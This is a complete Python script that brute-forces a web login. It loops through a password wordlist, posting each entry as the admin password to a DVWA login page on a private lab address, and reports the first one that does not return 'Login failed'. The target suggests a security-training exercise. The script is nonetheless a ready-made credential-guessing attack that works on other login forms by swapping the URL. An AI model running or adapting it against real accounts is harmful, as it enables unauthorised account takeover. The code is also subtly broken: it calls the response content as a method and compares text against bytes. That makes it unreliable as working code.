#!/usr/bin/env python

# login_bruteforcer.py

import requests

target_url = "http://10.0.2.20/dvwa/login.php"
data_dict = {"username":"admin", "password":"", "Login":"submit"}

with open("passwords.list", "r") as wordlist:
	for line in wordlist:
		word = line.strip()
		data_dict["password"] = word
		response = requests.post(target_url, data=data_dict)
		if "Login failed" not in response.content():
			print("[+] Password found --> " + word)
			exit()
		
print("\n...End of program...\n")
